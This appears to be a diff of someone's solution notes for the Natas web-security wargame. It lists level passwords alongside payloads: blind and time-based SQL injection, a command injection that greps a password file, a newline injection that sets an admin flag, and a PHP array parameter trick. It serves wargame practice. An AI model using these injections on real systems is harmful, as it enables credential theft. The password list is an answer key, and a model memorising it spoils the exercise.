@@ -16,4 +16,11 @@
 15 - AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J - /?debug&username=natas16"%20and%20password%20like%20binary%20%20%20"W%
 16 - WaIHEacj63wnNIBROHeqi3p9t0m5nhmh - /?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)
 17 - 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw - ?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23
-18 - xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP - 
+18 - xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP - brut force with PHPSESSID
+19 - 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs - brut force with PHPSESSID model
+20 - eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF - setting name to foo%0Aadmin%201
+21 - IFekPyrQXftziDEsUr3x21sYuahypdgJ - adding admin field to form and restore session id
+22 - chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ - curling
+23 - D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE - 100 iloveyou
+24 - OsRmXFguozKpTZZ5X14zNO43379LZveg - passwd[]=d
+25 - GHF6X7YwACaYYssHVY05cFq83hRktl4c - 
